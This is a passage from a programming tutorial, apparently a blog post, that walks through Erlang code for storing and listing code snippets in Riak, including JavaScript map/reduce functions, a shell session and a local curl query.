<span class='line-number'>17</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">to_json</span><span class="p">(</span><span class="nl">#snippet</span><span class="p">{</span><span class="n">key</span><span class="o">=</span><span class="nv">K</span><span class="p">,</span> <span class="n">title</span><span class="o">=</span><span class="nv">T</span><span class="p">,</span> <span class="n">left</span><span class="o">=</span><span class="nv">L</span><span class="p">,</span> <span class="n">right</span><span class="o">=</span><span class="nv">R</span><span class="p">,</span> <span class="n">created</span><span class="o">=</span><span class="nv">C</span><span class="p">})</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Data</span> <span class="o">=</span> <span class="p">[{</span><span class="n">key</span><span class="p">,</span> <span class="nv">K</span><span class="p">},</span> <span class="p">{</span><span class="n">title</span><span class="p">,</span> <span class="nv">T</span><span class="p">},</span> <span class="p">{</span><span class="n">left</span><span class="p">,</span> <span class="nv">L</span><span class="p">},</span> <span class="p">{</span><span class="n">right</span><span class="p">,</span> <span class="nv">R</span><span class="p">},</span> <span class="p">{</span><span class="n">created</span><span class="p">,</span> <span class="nv">C</span><span class="p">}],</span>
</span><span class='line'>  <span class="nn">csd_json</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Data</span><span class="p">,</span> <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="nf">from_json</span><span class="p">(</span><span class="nv">SnippetJson</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Data</span> <span class="o">=</span> <span class="nn">csd_json</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">SnippetJson</span><span class="p">,</span> <span class="k">fun</span> <span class="n">is_string</span><span class="o">/</span><span class="mi">1</span><span class="p">),</span>
</span><span class='line'>  <span class="nl">#snippet</span><span class="p">{</span>
</span><span class='line'>    <span class="n">key</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">key</span><span class="p">,</span> <span class="nv">Data</span><span class="p">),</span>
</span><span class='line'>    <span class="n">title</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">title</span><span class="p">,</span> <span class="nv">Data</span><span class="p">),</span>
</span><span class='line'>    <span class="n">left</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">left</span><span class="p">,</span> <span class="nv">Data</span><span class="p">),</span>
</span><span class='line'>    <span class="n">right</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">right</span><span class="p">,</span> <span class="nv">Data</span><span class="p">),</span>
</span><span class='line'>    <span class="n">created</span> <span class="o">=</span> <span class="nn">proplists</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="n">created</span><span class="p">,</span> <span class="nv">Data</span><span class="p">)</span>
</span><span class='line'>  <span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The above functions are obviously used to convert snippets to and from JSON. These are used when passing snippets to the browser or for storing them in the database.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">title</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">left</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">right</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(</span><span class="n">created</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="n">true</span><span class="p">;</span>
</span><span class='line'><span class="nf">is_string</span><span class="p">(_)</span> <span class="o">-&gt;</span> <span class="n">false</span><span class="p">.</span>
</span></code></pre></td></tr></table></div></figure>


<p>This last function exists as a helper function during conversion between Erlang proplists and JSON format and is used to highlight those values which are intended to be strings.</p>

<p>That covers off the interface to the snippet &ldquo;schema&rdquo;, but it doesn&rsquo;t show how an individual snippet ends up in the database. Let&rsquo;s take a look at the code in the storage module <code>csd_snippet_store</code>.</p>

<h3><a id="csd_snippet_store"></a><code>csd_snippet_store</code> module</h3>

<p>To start with, let&rsquo;s look at the module header including some handy defines which we&rsquo;ll need to dive into a little bit.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="p">-</span><span class="ni">module</span><span class="p">(</span><span class="n">csd_snippet_store</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">author</span><span class="p">(</span><span class="n">&#39;OJ Reeves &lt;oj@buffered.io&gt;&#39;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">BUCKET</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;snippet&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">USERID_INDEX</span><span class="p">,</span> <span class="s">&quot;userid&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">LIST_MAP_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(v){var d = Riak.mapValuesJson(v)[0]; return [{key:d.key,title:d.title,created:d.created}];}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'><span class="p">-</span><span class="ni">define</span><span class="p">(</span><span class="no">REDUCE_SORT_JS</span><span class="p">,</span> <span class="o">&lt;&lt;</span><span class="s">&quot;function(a,b){return a.created&lt;b.created?1:(a.created&gt;b.created?-1:0);}&quot;</span><span class="o">&gt;&gt;</span><span class="p">).</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first two defines are obvious. The next two are much more interesting. Here we can see some JavaScript code that we&rsquo;re going to be using during map/reduce phases when searching for snippets. Given that the code above isn&rsquo;t that nice to read, let&rsquo;s expand it out to see what it&rsquo;s doing:</p>

<figure class='code'><figcaption><span>LIST_MAP_JS </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span><span class="p">(</span><span class="nx">v</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="kd">var</span> <span class="nx">d</span> <span class="o">=</span> <span class="nx">Riak</span><span class="p">.</span><span class="nx">mapValuesJson</span><span class="p">(</span><span class="nx">v</span><span class="p">)[</span><span class="mi">0</span><span class="p">];</span>
</span><span class='line'>    <span class="k">return</span> <span class="p">[{</span> <span class="nx">key</span><span class="o">:</span> <span class="nx">d</span><span class="p">.</span><span class="nx">key</span><span class="p">,</span> <span class="nx">title</span><span class="o">:</span> <span class="nx">d</span><span class="p">.</span><span class="nx">title</span><span class="p">,</span> <span class="nx">created</span><span class="o">:</span> <span class="nx">d</span><span class="p">.</span><span class="nx">created</span> <span class="p">}];</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Map functions in Riak take up to 3 values:</p>

<ol>
<li>The value being mapped over. If the map phase is the first of the phases then this value will be the full object pulled from Riak.</li>
<li>The key data associated with the value. This is the (optional) value that is passed in alongside the key in the input phase.</li>
<li>A value passed into the map phase which remains consistent for each value that is mapped over.</li>
</ol>


<p>In our case, we&rsquo;re only interested in the first argument, the value that is coming out of Riak. We&rsquo;re also only interested in the contents of the value itself. We use the built-in function <code>Riak.mapValuesJson</code> to pull out the value as JSON. From that value we&rsquo;re only interested in the <code>key</code>, the <code>title</code> and the <code>created</code> properties. The map function much produce a list of values, so we return this new JSON object wrapped in a list.</p>

<p>It&rsquo;s not yet obvious, though it will be, but this is the function that will be used when we list all of the snippets that a single user has submitted. Next up is the reduce phase:</p>

<figure class='code'><figcaption><span>REDUCE_SORT_JS </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='javascript'><span class='line'><span class="kd">function</span><span class="p">(</span><span class="nx">a</span><span class="p">,</span> <span class="nx">b</span><span class="p">)</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>    <span class="k">return</span> <span class="nx">a</span><span class="p">.</span><span class="nx">created</span> <span class="o">&lt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">created</span> <span class="o">?</span> <span class="mi">1</span> <span class="o">:</span> <span class="p">(</span><span class="nx">a</span><span class="p">.</span><span class="nx">created</span> <span class="o">&gt;</span> <span class="nx">b</span><span class="p">.</span><span class="nx">created</span> <span class="o">?</span> <span class="o">-</span><span class="mi">1</span> <span class="o">:</span> <span class="mi">0</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>Those of you familiar with Riak will have noticed that this function doesn&rsquo;t look like a typical reduce function. In Riak the reduce phase functions have the same signature as map functions. The function shown above does not fit this description.</p>

<p>In our reduce phase for listing a user&rsquo;s snippets, we&rsquo;re only interested in sorting the snippets by the date in which they were submitted (most recent first). The function above takes two snippets and returns the result of the comparison based on the date. This function is used in conjunction with another built-in function, <code>Riak.reduceSort</code>. We pass in our sort comparison to the reduce phase as the argument to the phase and the built-in will execute it for each required comparison to make the resulting list of values ordered correctly.</p>

<p>With that out of the way, let&rsquo;s take a look at the first of the Erlang functions which fetches a single snippet based on its key.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Exports</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="p">-</span><span class="ni">export</span><span class="p">([</span><span class="n">save</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">fetch</span><span class="o">/</span><span class="mi">2</span><span class="p">,</span> <span class="n">list_for_user</span><span class="o">/</span><span class="mi">2</span><span class="p">]).</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% API Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Key</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">Key</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">SnippetJson</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">get_value</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">),</span>
</span><span class='line'>      <span class="nv">Snippet</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">from_json</span><span class="p">(</span><span class="nv">SnippetJson</span><span class="p">),</span>
</span><span class='line'>      <span class="nv">UserId</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">get_index</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="n">int</span><span class="p">,</span> <span class="no">?USERID_INDEX</span><span class="p">),</span>
</span><span class='line'>      <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">set_user_id</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)};</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="nv">Reason</span><span class="p">}</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>The first thing you&rsquo;ll notice is that the first parameter to the function is the <code>RiakPid</code> which we will use to talk to Riak. The second parameter is the <code>Key</code> (identifier) of the snippet. The function calls <code>csd_riak:fetch</code> which attempts to pull a Riak object out of Riak using the key as the id for the object to read.</p>

<p>If that succeeds then a valid Riak object is returned. This contains all the detail of the object as it is stored in Riak including meta data. At this point we&rsquo;re only interested in two things:</p>

<ol>
<li>The value stored in the object (which should be the snippet data in JSON format).</li>
<li>The value of the <code>user_id</code> index which identifies the person who created the snippet.</li>
</ol>


<p>These two values are pulled from the Riak object and are used to construct a valid snippet instance which is then returned to the caller.</p>

<p>We&rsquo;re also interested in listing snippets for a given user, so let&rsquo;s take a look at the code for that:</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">list_for_user</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">MR1</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_input_index</span><span class="p">(</span><span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">create</span><span class="p">(),</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="n">int</span><span class="p">,</span>
</span><span class='line'>    <span class="no">?USERID_INDEX</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR2</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_map_js</span><span class="p">(</span><span class="nv">MR1</span><span class="p">,</span> <span class="no">?LIST_MAP_JS</span><span class="p">,</span> <span class="n">false</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">MR3</span> <span class="o">=</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">add_reduce_sort_js</span><span class="p">(</span><span class="nv">MR2</span><span class="p">,</span> <span class="no">?REDUCE_SORT_JS</span><span class="p">),</span>
</span><span class='line'>
</span><span class='line'>  <span class="nv">Result</span> <span class="o">=</span> <span class="k">case</span> <span class="nn">csd_riak_mr</span><span class="p">:</span><span class="n">run</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">MR3</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">[{</span><span class="mi">1</span><span class="p">,</span> <span class="nv">List</span><span class="p">}]}</span> <span class="o">-&gt;</span> <span class="nv">List</span><span class="p">;</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="p">[]}</span> <span class="o">-&gt;</span> <span class="p">[]</span>
</span><span class='line'>  <span class="k">end</span><span class="p">,</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Result</span><span class="p">}.</span>
</span><span class='line'>
</span><span class='line'><span class="c">% ... snip ...</span>
</span></code></pre></td></tr></table></div></figure>


<p>Here&rsquo;s where we are first using our new map/reduce module to help construct a valid map/reduce job which pulls out the list of snippets. The first line of the function is specifying that we&rsquo;re interested in all values in <code>?BUCKET</code> (the snippet bucket) which have an <code>int</code> index called <code>?USERID_INDEX</code> (the index of the submitting user&rsquo;s id) that is the same as the specified <code>UserId</code> passed into the function. We then take this job and add a JavaScript map phase where we pass in the <code>?LIST_MAP_JS</code> (details of which we have just seen above). Notice that we pass in <code>false</code> as the last parameter as we&rsquo;re not interested in returning the results of this phase from the query, we just want those values passed to the next phase.</p>

<p>The last of the phases is a JavaScript reduce phase that uses Riak&rsquo;s sorting functionality. We pass in <code>?REDUCE_SORT_JS</code> which causes the sort to happen in reverse chronological order.</p>

<p>With our map/reduce constructed, we execute this in Riak and check the result. The first thing to note is that we&rsquo;re currently not checking for errors. Right now we want the process to crash should an error occur. Later in the series we&rsquo;ll be looking a bit more at error handling, but for the purpose of this post it&rsquo;s out of scope.</p>

<p>The two patterns we do check for cover the two cases that may arise in normal use. When the map/reduce job runs and succeeds, the result will be in the format: <code>{ok, [{&lt;phase number&gt;, &lt;results&gt;}]}</code>. Phase numbers are zero-based. The list that is returned will only contain the results that we asked Riak to keep.</p>

<p>Given these conditions we can see that if the map/reduce job runs and extracts results, we can expect to see a list with one element in it which is the result of the reduce phase. Matching this to <code>{ok, [{1, List}]}</code> gives us direct access to the results in the <code>List</code> value.</p>

<p>If, however, there isn&rsquo;t any data in Riak that matches the query Riak will return no results for the phase. Hence we also need to match against this case, <code>{ok, []}</code>, and return an empty list which implies that there aren&rsquo;t any entries.</p>

<p>Now that listing snippets for the user is done, let&rsquo;s look at the save functionality.</p>

<figure class='code'><figcaption><span>apps/csd_core/src/csd_snippet_store.erl (partial) </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="c">% ... snip ...</span>
</span><span class='line'>
</span><span class='line'><span class="nf">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">Key</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">get_key</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">),</span>
</span><span class='line'>  <span class="k">case</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">Key</span><span class="p">)</span> <span class="k">of</span>
</span><span class='line'>    <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">NewRiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">update</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">)),</span>
</span><span class='line'>      <span class="n">persist</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">NewRiakObj</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">);</span>
</span><span class='line'>    <span class="p">{</span><span class="n">error</span><span class="p">,</span> <span class="n">notfound</span><span class="p">}</span> <span class="o">-&gt;</span>
</span><span class='line'>      <span class="nv">RiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">create</span><span class="p">(</span><span class="no">?BUCKET</span><span class="p">,</span> <span class="nv">Key</span><span class="p">,</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">to_json</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">)),</span>
</span><span class='line'>      <span class="n">persist</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">)</span>
</span><span class='line'>  <span class="k">end</span><span class="p">.</span>
</span><span class='line'>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'><span class="c">%% Private Function Definitions</span>
</span><span class='line'><span class="c">%% --------------------------------------------------------------------------------------</span>
</span><span class='line'>
</span><span class='line'><span class="nf">persist</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">RiakObj</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">)</span> <span class="o">-&gt;</span>
</span><span class='line'>  <span class="nv">UserId</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">get_user_id</span><span class="p">(</span><span class="nv">Snippet</span><span class="p">),</span>
</span><span class='line'>  <span class="nv">UpdatedRiakObj</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">set_index</span><span class="p">(</span><span class="nv">RiakObj</span><span class="p">,</span> <span class="n">int</span><span class="p">,</span> <span class="no">?USERID_INDEX</span><span class="p">,</span> <span class="nv">UserId</span><span class="p">),</span>
</span><span class='line'>  <span class="n">ok</span> <span class="o">=</span> <span class="nn">csd_riak</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">RiakPid</span><span class="p">,</span> <span class="nv">UpdatedRiakObj</span><span class="p">),</span>
</span><span class='line'>  <span class="p">{</span><span class="n">ok</span><span class="p">,</span> <span class="nv">Snippet</span><span class="p">}.</span>
</span></code></pre></td></tr></table></div></figure>


<p>Let&rsquo;s start by looking at the <code>persist</code> function as this is invoked in two spots inside the <code>save</code> function. As you can see when the snippet is persisted we take the id of the user who submitted it and add a new index to the Riak object which contains this value. We then push the object into the store. Easy peasy!</p>

<p>The <code>save</code> function is also quite self-explanatory. It first attempts to fetch an existing object from Riak using the snippet&rsquo;s key as the identifier. If the value exists, this value is updated with the new snippet information. If it doesn&rsquo;t exist, a new Riak object is created. Both of these code paths call the <code>persist</code> function to finish the job of storing the snippet.</p>

<p>We&rsquo;re done! That&rsquo;s the full story of snippet storage. Let&rsquo;s launch the application and play with storing snippets.</p>

<figure class='code'><figcaption><span>snippet storage in action </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='erlang'><span class='line'><span class="sc">$ </span><span class="n">make</span> <span class="n">webstart</span>
</span><span class='line'><span class="p">...</span> <span class="n">snip</span> <span class="p">...</span>
</span><span class='line'>
</span><span class='line'><span class="mi">1</span><span class="o">&gt;</span> <span class="nv">S</span> <span class="o">=</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">to_snippet</span><span class="p">(</span><span class="s">&quot;The Basics&quot;</span><span class="p">,</span> <span class="s">&quot;var x = 1;&quot;</span><span class="p">,</span> <span class="s">&quot;int x = 1;&quot;</span><span class="p">,</span> <span class="mi">12345</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">snippet</span><span class="p">,</span><span class="mi">12345</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;AIUWiw==&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span><span class="s">&quot;The Basics&quot;</span><span class="p">,</span><span class="s">&quot;var x = 1;&quot;</span><span class="p">,</span>
</span><span class='line'>         <span class="s">&quot;int x = 1;&quot;</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;2012-06-05T21:28:20.314Z&quot;</span><span class="o">&gt;&gt;</span><span class="p">}</span>
</span><span class='line'><span class="mi">2</span><span class="o">&gt;</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">save</span><span class="p">(</span><span class="nv">S</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">ok</span><span class="p">,{</span><span class="n">snippet</span><span class="p">,</span><span class="mi">12345</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;AIUWiw==&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span><span class="s">&quot;The Basics&quot;</span><span class="p">,</span><span class="s">&quot;var x = 1;&quot;</span><span class="p">,</span>
</span><span class='line'>             <span class="s">&quot;int x = 1;&quot;</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;2012-06-05T21:28:20.314Z&quot;</span><span class="o">&gt;&gt;</span><span class="p">}}</span>
</span><span class='line'><span class="mi">3</span><span class="o">&gt;</span> <span class="nn">csd_snippet</span><span class="p">:</span><span class="n">fetch</span><span class="p">(</span><span class="s">&quot;AIUWiw==&quot;</span><span class="p">).</span>
</span><span class='line'><span class="p">{</span><span class="n">ok</span><span class="p">,{</span><span class="n">snippet</span><span class="p">,</span><span class="mi">12345</span><span class="p">,</span><span class="o">&lt;&lt;</span><span class="s">&quot;AIUWiw==&quot;</span><span class="o">&gt;&gt;</span><span class="p">,</span><span class="s">&quot;The Basics&quot;</span><span class="p">,</span><span class="s">&quot;var x = 1;&quot;</span><span class="p">,</span>
</span><span class='line'>             <span class="s">&quot;int x = 1;&quot;</span><span class="p">,</span><span class="s">&quot;2012-06-05T21:28:20.314Z&quot;</span><span class="p">}}</span>
</span></code></pre></td></tr></table></div></figure>


<p>One thing you&rsquo;ll notice here is that we&rsquo;ve added a snippet for a user with an Id of <code>12345</code>. This user <em>does not exist</em> in Riak. In Riak you can add an index for a particular value but there is no way of adding the equivalent of a foreign key in the RDBMS world.</p>

<p>While we&rsquo;re here, let&rsquo;s see what Riak gives is when we talk directly to it via curl:</p>

<figure class='code'><figcaption><span>snippet storage in action </span></figcaption>
<div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>curl -i http://127.0.0.1:8091/riak/snippet/AIUWiw<span class="o">==</span>
</span><span class='line'>HTTP/1.1 200 OK
